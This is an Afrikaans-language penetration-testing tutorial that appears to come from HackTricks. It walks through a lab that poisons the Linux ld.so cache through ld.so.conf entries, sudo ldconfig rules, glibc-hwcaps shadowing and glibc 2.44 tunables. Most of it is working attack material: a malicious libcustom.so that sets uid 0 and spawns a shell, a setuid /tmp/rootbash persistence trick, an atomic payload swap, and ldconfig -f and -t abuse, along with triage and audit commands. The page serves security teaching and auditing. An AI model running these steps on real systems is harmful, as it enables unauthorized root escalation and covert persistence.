# ld.so privesc exploit-voorbeeld

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy is ’n gefokusde lab vir die vergiftiging van die **system linker cache deur `/etc/ld.so.conf` of `ldconfig`**. Vir missing-library injection, skryfbare `RPATH`/`RUNPATH`, `LD_PRELOAD` en ander generiese SUID linker abuse, sien [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Berei die omgewing voor

In die volgende afdeling kan jy die kode vind van die lêers wat ons gaan gebruik om die omgewing voor te berei.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Skep** daardie lêers op jou masjien in dieselfde vouer
2. **Kompileer die** **biblioteek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopieer** `libcustom.so` na `/usr/lib` en verfris die kas: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root-regte)
4. **Kompileer die** **uitvoerbare lêer**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kontroleer die omgewing

Kontroleer dat _libcustom.so_ vanaf _/usr/lib_ **gelaai** word en dat jy die binêre lêer kan **uitvoer**.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Nuttige triage-opdragte

Wanneer jy ’n werklike teiken aanval, verifieer die **presiese library-naam** wat die binary benodig, wat die loader **tans resolve**, en watter gekonfigureerde paaie skryfbaar is sonder om die aktiewe cache te wysig.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Gebruik `ldd` slegs op ’n **trusted** executable. Sommige implementasies of ongewone ELF-interpreters kan veroorsaak dat dit attacker-controlled code uitvoer; `objdump -p ./file | grep NEEDED` lys direct dependencies veilig. Vir ’n trusted target wys die aanroeping van die ontdekte interpreter met `--list` die werklike resolution. Vergelyk daardie uitvoer met `--inhibit-cache --list`: ’n verskil bewys dat `/etc/ld.so.cache`, eerder as ’n gewone search-path-reël, die object gekies het.<sup>[[1]](#references)[[4]](#references)</sup>

’n Paar nuttige gotchas:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **werk gewoonlik nie** omdat die redirection deur jou huidige shell gedoen word. Gebruik eerder
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binaries loop in **secure-execution mode**: `LD_LIBRARY_PATH`
word geïgnoreer, terwyl `LD_PRELOAD` beperk word (name wat ’n slash bevat, word
geïgnoreer, en slegs setuid-gemerkte libraries in standard directories mag
preloaded word). Sodra root `ldconfig` uitvoer, kan directories wat in
`/etc/ld.so.conf` gelys word, in `/etc/ld.so.cache` beland; hierdie
misconfiguration kan dus steeds privileged programs beïnvloed.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` word ook in secure-execution mode geïgnoreer tensy `/etc/suid-debug` bestaan, dus versamel die trace daarvan uit ’n ekwivalente non-SUID run eerder as om uitvoer van die privileged execution te verwag.<sup>[[1]](#references)</sup>
- Op glibc 2.33 en nuwer stel die dynamic loader ook
`--list-diagnostics` bloot, wat machine-readable loader diagnostics en
ingeboude search-path-inligting druk wanneer ’n hijack nie optree soos verwag nie.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache- en SONAME-beperkings

`ldconfig` cache nie elke arbitrêre file in ’n gekonfigureerde directory nie: dit ondersoek ELF headers, herken name wat met `lib*.so*` of `ld-*.so*` ooreenstem, en verwag die konvensionele `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain. Die injected object moet dus die target architecture/class, die presiese `DT_NEEDED`-name (gewoonlik sy `DT_SONAME`), en enige symbols/versions hê wat die victim resolve.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Verkies 'n target-specific library soos hierdie voorbeeld. Om 'n algemene SONAME met 'n onvolledige object te shadow, kan elke proses breek wat dit resolve voordat die bedoelde bevoorregte target loop.<sup>[[3]](#references)</sup>

### Volharding van cached paths en atomic swaps

Die cache teken 'n **library name to pathname**-mapping aan; dit embed nie die shared object nie. Nadat 'n attacker-beheerde pathname gecache is, beïnvloed die vervanging van die object by daardie presiese path nuutgestarte prosesse sonder nog 'n `ldconfig`-run. Dit maak 'n nuttige time-of-check/time-of-use-patroon moontlik: stel 'n geldige library bloot tydens 'n administrator se cache rebuild of inspeksie, en rename dan die payload atomic daaroor. Bestaande prosesse behou hul reeds gemapte object.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Net so sal die verwydering van die kwaadwillige reël uit `ld.so.conf` nie op sigself ’n reeds geskryfde inskrywing verwyder nie: die administrateur moet die onbetroubare objek verwyder, eienaarskap/skryftoegang regstel en die kas herbou. Gebruik die `--inhibit-cache`-vergelyking hierbo om ’n verouderde kasinskrywing van ’n steeds aktiewe konfigurasiepad te onderskei.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

In hierdie scenario, veronderstel ’n administrateur het ’n kwesbare inskrywing bygevoeg tot ’n
lêer onder `/etc/ld.so.conf.d/` wat deur die stelsel se
`/etc/ld.so.conf` ingesluit word.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Die kwesbare vouer is _/home/ubuntu/lib_ (waar ons skryftoegang het).\
**Laai af en compileer** die volgende code binne daardie pad:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
As jy verwag dat **root** (of ’n ander rekening met verhoogde voorregte) die kwesbare binary later sal uitvoer, is dit gewoonlik beter om ’n **root-owned artifact** agter te laat eerder as om ’n interaktiewe shell te begin. Byvoorbeeld:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Dan, nadat die bevoorregte uitvoering plaasvind, kan jy `/tmp/rootbash -p` gebruik.

Noudat ons die **kwaadwillige libcustom library binne die verkeerd gekonfigureerde** pad **geskep** het, moet die verstekkas herbou word deur ’n suksesvolle bevoorregte **`ldconfig`**-uitvoering. ’n Herlaai help slegs waar die plaaslike selflaaiproses dit werklik uitvoer; andersins moet jy wag vir ’n administrateuraksie of ’n onveilige sudo-reël gebruik indien een beskikbaar is.<sup>[[2]](#references)</sup>

Nadat dit gebeur het, **kontroleer weer** waar die `sharedvuln`-uitvoerbare lêer die `libcustom.so`-library vandaan laai:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Soos jy kan sien, **laai dit dit vanaf `/home/ubuntu/lib`** en indien enige gebruiker dit uitvoer, sal ’n shell uitgevoer word:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Let daarop dat ons in hierdie voorbeeld nie voorregte verhoog het nie, maar deur die uitgevoerde commands te wysig en **te wag dat root of ’n ander bevoorregte gebruiker die kwesbare binary uitvoer**, sal ons voorregte kan verhoog.

### Moderne `glibc-hwcaps` shadowing

Sedert glibc 2.33 kan die loader geoptimaliseerde libraries onder `glibc-hwcaps/<level>/` binne **elke library search directory** verkies. Gevolglik is dit onvoldoende om slegs `/home/ubuntu/lib` na te gaan: ’n skryfbare versoenbare subdirectory soos `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` kan die basislibrary shadow nadat `ldconfig` dit geïndekseer het, terwyl ander CPUs steeds die basisobjek gebruik. Dit bied ook ’n argitektuur-selektiewe hijack wat gemis kan word wanneer validasie op ’n ander CPU plaasvind.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Die huidige glibc-hardening-riglyne beveel aan dat duplikaat-SONAMEs, nie-standaard search locations en objects in `glibc-hwcaps`-subdirectories vermy word. Vanuit ’n ouditperspektief, pas ownership- en writeability-checks rekursief toe op gekonfigureerde directories en hul parent path components.<sup>[[3]](#references)</sup>

### Ander misconfigurations - Dieselfde vuln

In die vorige voorbeeld het ons ’n misconfiguration nagemaak waar ’n administrator **’n non-privileged folder binne ’n configuration file in `/etc/ld.so.conf.d/` gestel het**.\
Maar daar is ander misconfigurations wat dieselfde vulnerability kan veroorsaak: indien jy **write permissions** in ’n gelaaide **config file** het, ’n file in ’n writable `/etc/ld.so.conf.d/` directory kan skep, of na `/etc/ld.so.conf` kan skryf, kan jy dieselfde vulnerability konfigureer en exploit.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Gestel jy het sudo-voorregte oor `ldconfig`**. `ldconfig` aanvaar scan directories as positional arguments, dus is die kortste cache-poisoning-vorm dikwels eenvoudig:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternatiewelik kies `-f` ’n ander konfigurasielêer terwyl die verstekkasuitset behou word. Dit is nuttig wanneer ’n argumentfilter posisionele gidse blokkeer, maar steeds `-f` toelaat, of wanneer verskeie paaie ingevoeg moet word:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nou, soos aangedui in die **vorige exploit**, **skep die malicious library binne `/tmp`**.\
En laastens, laai die pad en kontroleer waarvandaan die binary die library laai:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Soos jy kan sien, kan jy dieselfde kwesbaarheid uitbuit as jy sudo-voorregte oor `ldconfig` het.** Die opsiebesonderhede is belangrik wanneer ’n beperkte sudo-reël geassesseer word: `-f` kies ’n ander konfigurasie, maar herbou steeds `/etc/ld.so.cache`; `-C` herlei die cache elders; `-N` voorkom dat die cache herbou word; en `-X` voorkom skakelopdaterings, maar **herbou steeds die cache tensy dit saam met `-N` gebruik word**. `-n` impliseer `-N`, dus kan dit skakels in verskafde gidse opdateer, maar kan dit nie die cache vergiftig nie; `-r` werk onder ’n alternatiewe root en verander normaalweg nie die gasheer se cache nie.<sup>[[2]](#references)</sup>

## glibc 2.44: gekasde stelselwye tunables

Vanaf glibc 2.44 ontleed `ldconfig` ook `/etc/tunables.conf` en stoor sy instellings as ’n uitbreiding in `/etc/ld.so.cache`. Die lêer aanvaar `include`-direktiewe en per-proses-filters. Voorvoegsels beheer die omvang: `@` teiken slegs `AT_SECURE`-prosesse, `$` sluit hulle uit, en `*` dek albei. Dit brei die ouditgrens verder as biblioteekgidse uit: ’n skryfbare tunables-konfigurasie of ’n ingeslote lêer kan toekomstige programstarts beïnvloed nadat ’n bevoorregte cache-herbouing plaasgevind het.<sup>[[7]](#references)</sup>

Dieselfde vrystelling voeg `ldconfig -t TUNCONF` by, wat ’n alternatiewe tunables-lêer kies terwyl dit steeds die normale cache skryf, tensy ’n ander opsie dit verander. Daarom moet wrappers en sudo-reëls wat slegs probeer het om `-f` te blokkeer, ook `-t`, arbitrêre posisionele gidse en manipulasie van cache-uitset verwerp.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Dit is nie outomatiese arbitrêre kode-uitvoering nie. Dit is ’n bevoorregte **loader-behavior manipulation**-primitief: glibc waarsku uitdruklik dat stelselwye waardes sekuriteitsensitiewe tunables op setuid/setgid-programme kan toepas sonder sekuriteitskeuring per tunable. Lys die gasheer se werklike tunables met `--list-tunables` en soek na teikenspesifieke allocator-veranderinge, CPU-hardening-veranderinge of denial-of-service-toestande eerder as om ’n universele payload te aanvaar.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening van die Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostiek van die Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Stelselwye Tunables (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Voeg stelselwye tunables by: ldconfig-deel (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
